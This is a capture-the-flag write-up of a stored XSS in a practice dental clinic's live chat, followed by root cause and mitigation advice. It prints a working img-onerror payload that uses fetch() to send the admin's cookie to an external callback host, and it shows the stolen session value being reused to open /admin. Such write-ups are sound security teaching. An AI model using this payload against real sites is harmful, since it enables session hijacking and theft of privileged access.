---
title: "Stored XSS Leads to Session Hijacking | DillyDent"
date: 2026-06-30 23:30:00 +0530
categories: [A05 - Injection, Cross-Site Scripting]
tags: [stored-xss, session-hijacking, cookie-exfiltration, admin-bot, live-chat, webverse, webverse-pro]
platform: WebVerse Pro
author: Shivansh Sharma
image:
  path: /assets/images/posts/dillydent-stored-xss.webp
  alt: "DillyDent Stored XSS session hijacking"
---

## Lab Link

[DillyDent](https://dashboard.webverselabs-pro.com/mystery-challenges/dillydent)

---

## Overview

**DillyDent** was a WebVerse Pro daily challenge based on a small dental clinic website with a live reception chat feature.

The application allowed visitors to send messages through the chat widget. Those messages were later viewed by a receptionist/admin context. Because the chat message content was rendered without proper sanitization, an attacker could inject HTML with JavaScript event handlers.

By sending a malicious image tag through the chat, the receptionist/admin browser executed JavaScript and leaked the privileged `dd_session` cookie to the WebVerse Interact endpoint. Reusing that cookie allowed access to the `/admin` panel, where the flag was displayed.

---

## Objective

The goal of the lab was to gain access to the privileged receptionist/admin area and retrieve the flag.

---

## Vulnerability Identification

The challenge briefing hinted at a weak live chat implementation:

> The receptionist runs the front desk, the phones, and the new website chat all at once.

This suggested that submitted chat messages were being reviewed by a privileged user or bot. Since visitor-controlled chat messages were reflected back into the chat interface, the main test was whether the message body was safely escaped or rendered as raw HTML.

A basic HTML injection attempt showed that message content could be interpreted in the chat context, making stored cross-site scripting likely.

---

## Recon / Approach

The website exposed a visible **Chat with reception** button. Opening it displayed a visitor chat widget where messages could be submitted.

The attack approach was:

1. Submit an HTML payload through the chat.
2. Wait for the receptionist/admin bot to view the message.
3. Exfiltrate `document.cookie` to WebVerse Interact.
4. Reuse the stolen `dd_session` cookie.
5. Browse to `/admin`.
6. Read the flag from the admin panel.

The Interact endpoint was used as the external listener for confirming callback requests and receiving the stolen cookie.

---

## Exploitation

A malicious chat message was submitted using an image tag with an `onerror` event handler.

The working payload was:

```html
<img src=x onerror=\"fetch(\"http://85ae01de-4065-dillydent-e8349.interact.webverselabs-pro.com/exfil?c1=\"+ document.cookie, \"mode\":\"no-cors\")\" />
```

When the receptionist/admin context loaded the chat message, the broken image triggered the `onerror` handler. The JavaScript then sent the current browser cookie to the Interact endpoint.

The Interact history showed a request to `/exfil` containing the leaked session value:

```text
dd_session=139aa0638d77974e7960119f4efe69da
```

After obtaining the session cookie, it was added manually in the browser for the DillyDent challenge domain:

```text
Name: dd_session
Value: 139aa0638d77974e7960119f4efe69da
Path: /
```

With the privileged session active, visiting the admin route revealed the protected panel:

```text
/admin
```

---

## Proof / Flag

After reusing the leaked `dd_session` cookie and browsing to `/admin`, the flag was displayed.

```text
WEBVERSE{REDACTED}
```

---

## Root Cause

The root cause was unsafe rendering of visitor-controlled chat messages.

The application allowed user input from the live chat to be stored and later rendered in a privileged receptionist/admin context without proper output encoding or HTML sanitization. This allowed attacker-controlled JavaScript to execute in the admin session.

---

## Impact

An attacker could:

- Execute JavaScript in the receptionist/admin browser.
- Read non-HttpOnly cookies through `document.cookie`.
- Exfiltrate the privileged `dd_session` value.
- Hijack the receptionist/admin session.
- Access the protected `/admin` area.
- Retrieve sensitive data, including the flag.

This is a high-impact stored XSS issue because the payload executes against a privileged user rather than only the attacker.

---

## Mitigation

To fix this issue:

- Encode all chat message output before rendering it into HTML.
- Use a strict allowlist-based sanitizer if limited formatting is required.
- Mark session cookies as `HttpOnly`, `Secure`, and `SameSite=Lax` or `SameSite=Strict`.
- Avoid rendering untrusted chat content directly inside privileged dashboards.
- Add a Content Security Policy that limits inline JavaScript execution.
- Review admin-facing message queues for stored XSS exposure.
- Treat all customer-support and chat inboxes as high-risk XSS sinks.

---

## Lessons Learned

- Live chat systems are common stored XSS targets because untrusted visitor input is later viewed by staff.
- Admin bot interaction is often a strong CTF hint for stored XSS.
- Cookie exfiltration is possible when sensitive session cookies are not protected with `HttpOnly`.
- A stored XSS in a low-privileged public feature can become full admin compromise when the payload is viewed by a privileged user.
